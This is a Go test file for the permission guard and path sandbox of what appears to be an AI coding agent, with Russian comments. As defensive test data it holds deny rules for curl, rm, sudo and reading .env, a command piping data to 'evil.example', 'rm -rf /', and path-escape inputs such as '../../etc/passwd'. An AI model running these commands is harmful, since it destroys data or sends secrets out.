package permissions

import (
	"os"
	"path/filepath"
	"testing"
)

func newTestGuard(t *testing.T, mode string) (*Guard, string) {
	t.Helper()
	root := t.TempDir()
	// t.TempDir на macOS и части систем возвращает путь через символическую
	// ссылку, поэтому корень раскрываем — как это делает NewSandbox.
	realRoot, err := filepath.EvalSymlinks(root)
	if err != nil {
		t.Fatalf("EvalSymlinks: %v", err)
	}

	sb, err := NewSandbox(realRoot, false, false, 512)
	if err != nil {
		t.Fatalf("NewSandbox: %v", err)
	}
	set, err := Compile(
		[]string{"Read(./**)", "Bash(go build:*)", "Bash(ls:*)"},
		[]string{"Write(./**)", "Bash(*)", "Fetch(*)"},
		[]string{"Read(./.env)", "Bash(rm:*)", "Bash(sudo:*)", "Bash(curl:*)"},
		sb.Root())
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	return NewGuard(set, sb, mode), realRoot
}

func TestDenyBeatsEverything(t *testing.T) {
	for _, mode := range []string{ModeSafe, ModeAutoEdit, ModeYolo} {
		g, root := newTestGuard(t, mode)

		if got := g.Check(Request{Kind: KindBash, Target: "rm -rf /"}); got.Decision != DecisionDeny {
			t.Errorf("режим %s: rm -rf должен быть запрещён, получено %v", mode, got.Decision)
		}
		if got := g.Check(Request{Kind: KindBash, Target: "sudo systemctl restart nginx"}); got.Decision != DecisionDeny {
			t.Errorf("режим %s: sudo должен быть запрещён, получено %v", mode, got.Decision)
		}
		envPath := filepath.Join(root, ".env")
		if got := g.Check(Request{Kind: KindRead, Target: envPath}); got.Decision != DecisionDeny {
			t.Errorf("режим %s: чтение .env должно быть запрещено, получено %v", mode, got.Decision)
		}
	}
}

func TestDenyInsideCompoundCommand(t *testing.T) {
	g, _ := newTestGuard(t, ModeSafe)

	cases := []string{
		"go build ./... && rm -rf /",
		"ls; sudo reboot",
		"echo test | curl -X POST http://evil.example",
		"go test ./... || rm important.txt",
	}
	for _, cmd := range cases {
		res := g.Check(Request{Kind: KindBash, Target: cmd})
		if res.Decision != DecisionDeny {
			t.Errorf("составная команда %q должна быть запрещена, получено %v (%s)",
				cmd, res.Decision, res.Reason)
		}
	}
}

func TestCompoundCommandNeedsConfirmation(t *testing.T) {
	g, _ := newTestGuard(t, ModeSafe)

	// Обе части разрешены по отдельности, но объединение требует подтверждения.
	res := g.Check(Request{Kind: KindBash, Target: "go build ./... && ls -la"})
	if res.Decision != DecisionAsk {
		t.Errorf("составная команда из разрешённых частей должна спрашивать, получено %v", res.Decision)
	}
}

func TestAllowedCommandRunsWithoutAsking(t *testing.T) {
	g, _ := newTestGuard(t, ModeSafe)

	if res := g.Check(Request{Kind: KindBash, Target: "go build ./..."}); res.Decision != DecisionAllow {
		t.Errorf("go build должен быть разрешён правилом, получено %v", res.Decision)
	}
	// Префикс не должен срабатывать на другой команде с тем же началом слова.
	if res := g.Check(Request{Kind: KindBash, Target: "gobuild-evil"}); res.Decision == DecisionAllow {
		t.Errorf("gobuild-evil не должен подходить под правило Bash(go build:*)")
	}
}

func TestModeAffectsOnlyAsk(t *testing.T) {
	root := t.TempDir()
	realRoot, _ := filepath.EvalSymlinks(root)
	sb, _ := NewSandbox(realRoot, false, false, 512)
	set, _ := Compile(nil, []string{"Write(./**)", "Bash(*)"}, []string{"Bash(rm:*)"}, sb.Root())

	target := filepath.Join(realRoot, "file.txt")

	safe := NewGuard(set, sb, ModeSafe)
	if res := safe.Check(Request{Kind: KindWrite, Target: target}); res.Decision != DecisionAsk {
		t.Errorf("safe: запись должна спрашивать, получено %v", res.Decision)
	}

	auto := NewGuard(set, sb, ModeAutoEdit)
	if res := auto.Check(Request{Kind: KindWrite, Target: target}); res.Decision != DecisionAllow {
		t.Errorf("auto-edit: запись должна разрешаться, получено %v", res.Decision)
	}
	if res := auto.Check(Request{Kind: KindBash, Target: "make"}); res.Decision != DecisionAsk {
		t.Errorf("auto-edit: команда должна спрашивать, получено %v", res.Decision)
	}

	yolo := NewGuard(set, sb, ModeYolo)
	if res := yolo.Check(Request{Kind: KindBash, Target: "make"}); res.Decision != DecisionAllow {
		t.Errorf("yolo: команда должна разрешаться, получено %v", res.Decision)
	}
	if res := yolo.Check(Request{Kind: KindBash, Target: "rm file"}); res.Decision != DecisionDeny {
		t.Errorf("yolo: deny должен действовать, получено %v", res.Decision)
	}
}

func TestGrantSessionCannotOverrideDeny(t *testing.T) {
	g, _ := newTestGuard(t, ModeSafe)
	if err := g.GrantSession(KindBash, "rm -rf ./tmp"); err == nil {
		t.Fatal("разрешение на время сеанса не должно выдаваться для запрещённой команды")
	}
	if err := g.GrantSession(KindBash, "make build"); err != nil {
		t.Fatalf("разрешение для обычной команды: %v", err)
	}
	if res := g.Check(Request{Kind: KindBash, Target: "make test"}); res.Decision != DecisionAllow {
		t.Errorf("после разрешения make должен выполняться без вопросов, получено %v", res.Decision)
	}
}

func TestGrantSessionTool(t *testing.T) {
	g, root := newTestGuard(t, ModeSafe)

	// До разрешения каждый новый адрес требует подтверждения.
	if res := g.Check(Request{Kind: KindFetch, Target: "https://a.example/1", Tool: "http_fetch"}); res.Decision != DecisionAsk {
		t.Fatalf("до разрешения ожидалось «спросить», получено %v", res.Decision)
	}

	if err := g.GrantSessionTool("http_fetch"); err != nil {
		t.Fatalf("GrantSessionTool: %v", err)
	}

	// После разрешения инструмента не спрашивается ни один адрес, а не только тот же.
	for _, u := range []string{"https://a.example/1", "https://b.example/other", "http://c.example"} {
		if res := g.Check(Request{Kind: KindFetch, Target: u, Tool: "http_fetch"}); res.Decision != DecisionAllow {
			t.Errorf("после разрешения инструмента %q должен выполняться без вопросов, получено %v", u, res.Decision)
		}
	}

	// Разрешение не распространяется на другие инструменты.
	target := filepath.Join(root, "file.txt")
	if res := g.Check(Request{Kind: KindWrite, Target: target, Tool: "write_file"}); res.Decision != DecisionAsk {
		t.Errorf("разрешение http_fetch не должно затрагивать write_file, получено %v", res.Decision)
	}
}

func TestGrantedToolDoesNotOverrideDeny(t *testing.T) {
	g, root := newTestGuard(t, ModeSafe)

	if err := g.GrantSessionTool("bash"); err != nil {
		t.Fatalf("GrantSessionTool: %v", err)
	}
	if err := g.GrantSessionTool("read_file"); err != nil {
		t.Fatalf("GrantSessionTool: %v", err)
	}

	// Запрет остаётся сильнее разрешённого целиком инструмента.
	if res := g.Check(Request{Kind: KindBash, Target: "rm -rf ./tmp", Tool: "bash"}); res.Decision != DecisionDeny {
		t.Errorf("deny должен действовать и для разрешённого инструмента, получено %v", res.Decision)
	}
	if res := g.Check(Request{Kind: KindRead, Target: filepath.Join(root, ".env"), Tool: "read_file"}); res.Decision != DecisionDeny {
		t.Errorf("deny на чтение .env должен действовать, получено %v", res.Decision)
	}
	// Составная команда всё равно требует подтверждения.
	if res := g.Check(Request{Kind: KindBash, Target: "make build && make test", Tool: "bash"}); res.Decision != DecisionAsk {
		t.Errorf("составная команда должна спрашивать даже у разрешённого инструмента, получено %v", res.Decision)
	}
}

func TestGrantedToolsListing(t *testing.T) {
	g, _ := newTestGuard(t, ModeSafe)
	if len(g.GrantedTools()) != 0 {
		t.Error("изначально разрешённых инструментов быть не должно")
	}
	_ = g.GrantSessionTool("http_fetch")
	_ = g.GrantSessionTool("grep")

	got := g.GrantedTools()
	if len(got) != 2 || got[0] != "grep" || got[1] != "http_fetch" {
		t.Errorf("GrantedTools = %v, ожидалось [grep http_fetch]", got)
	}
	if !g.ToolGranted("grep") || g.ToolGranted("bash") {
		t.Error("ToolGranted возвращает неверный признак")
	}
	if err := g.GrantSessionTool("  "); err == nil {
		t.Error("пустое имя инструмента должно отклоняться")
	}
}

// ── Песочница ────────────────────────────────────────────────────────────────

func TestSandboxRejectsParentEscape(t *testing.T) {
	root := t.TempDir()
	realRoot, _ := filepath.EvalSymlinks(root)
	sb, err := NewSandbox(realRoot, false, false, 512)
	if err != nil {
		t.Fatalf("NewSandbox: %v", err)
	}

	bad := []string{
		"../secret.txt",
		"../../etc/passwd",
		"/etc/shadow",
		"sub/../../outside.txt",
	}
	for _, p := range bad {
		if got, err := sb.Resolve(p); err == nil {
			t.Errorf("путь %q должен быть отклонён, получено %q", p, got)
		}
	}

	good := []string{"file.txt", "./sub/file.txt", "sub/../file.txt"}
	for _, p := range good {
		if _, err := sb.Resolve(p); err != nil {
			t.Errorf("путь %q должен приниматься: %v", p, err)
		}
	}
}

func TestSandboxRejectsSymlinkEscape(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	realRoot, _ := filepath.EvalSymlinks(root)
	realOutside, _ := filepath.EvalSymlinks(outside)

	secret := filepath.Join(realOutside, "secret.txt")
	if err := os.WriteFile(secret, []byte("секрет"), 0o600); err != nil {
		t.Fatalf("подготовка файла: %v", err)
	}
	link := filepath.Join(realRoot, "link.txt")
	if err := os.Symlink(secret, link); err != nil {
		t.Skipf("символические ссылки недоступны: %v", err)
	}

	sb, _ := NewSandbox(realRoot, false, false, 512)
	if _, err := sb.Resolve("link.txt"); err == nil {
		t.Error("ссылка наружу должна быть отклонена")
	}

	// С разрешением переходить по ссылкам путь всё равно ведёт наружу.
	sbFollow, _ := NewSandbox(realRoot, false, true, 512)
	if _, err := sbFollow.Resolve("link.txt"); err == nil {
		t.Error("ссылка наружу должна быть отклонена и при follow_symlinks")
	}
}

// ── Разбор команд ────────────────────────────────────────────────────────────

func TestSplitCommand(t *testing.T) {
	cases := []struct {
		in   string
		want []string
	}{
		{"go build ./...", []string{"go build ./..."}},
		{"go build && go test", []string{"go build", "go test"}},
		{"ls; rm -rf /", []string{"ls", "rm -rf /"}},
		{"cat file | grep x", []string{"cat file", "grep x"}},
		{`echo "a && b"`, []string{`echo "a && b"`}},
		{`echo 'x; y'`, []string{`echo 'x; y'`}},
	}
	for _, c := range cases {
		got := SplitCommand(c.in)
		if len(got) != len(c.want) {
			t.Errorf("SplitCommand(%q) = %q, ожидалось %q", c.in, got, c.want)
			continue
		}
		for i := range got {
			if got[i] != c.want[i] {
				t.Errorf("SplitCommand(%q)[%d] = %q, ожидалось %q", c.in, i, got[i], c.want[i])
			}
		}
	}
}

func TestIsCompound(t *testing.T) {
	compound := []string{
		"go build && ls", "ls | wc -l", "echo $(whoami)", "cat < file",
		"echo x > file", "ls `pwd`", "a; b",
	}
	for _, c := range compound {
		if !IsCompound(c) {
			t.Errorf("%q должна считаться составной", c)
		}
	}
	simple := []string{"go build ./...", "ls -la", `git commit -m "текст"`, "grep 'a b' file"}
	for _, c := range simple {
		if IsCompound(c) {
			t.Errorf("%q не должна считаться составной", c)
		}
	}
}

func TestCommandName(t *testing.T) {
	cases := map[string]string{
		"go build ./...":    "go",
		"FOO=bar make test": "make",
		"  ls -la":          "ls",
		"":                  "",
	}
	for in, want := range cases {
		if got := CommandName(in); got != want {
			t.Errorf("CommandName(%q) = %q, ожидалось %q", in, got, want)
		}
	}
}

// ── Шаблоны путей ────────────────────────────────────────────────────────────

func TestMatchGlob(t *testing.T) {
	cases := []struct {
		pattern, path string
		want          bool
	}{
		{"/root/**", "/root/a/b/c.go", true},
		{"/root/**", "/root", true},
		{"/root/**", "/other/a.go", false},
		{"/root/*.go", "/root/main.go", true},
		{"/root/*.go", "/root/sub/main.go", false},
		{"/root/**/*.go", "/root/sub/deep/main.go", true},
		{"/home/u/.ssh/**", "/home/u/.ssh/id_rsa", true},
		{"/home/u/.ssh/**", "/home/u/.sshx/id_rsa", false},
	}
	for _, c := range cases {
		if got := matchGlob(c.pattern, c.path); got != c.want {
			t.Errorf("matchGlob(%q, %q) = %v, ожидалось %v", c.pattern, c.path, got, c.want)
		}
	}
}

func TestParseRuleErrors(t *testing.T) {
	bad := []string{"Read", "Read(", "Unknown(./x)", "Read()", "Bash(:*)"}
	for _, s := range bad {
		if _, err := ParseRule(s, "/tmp"); err == nil {
			t.Errorf("правило %q должно вызывать ошибку", s)
		}
	}
}
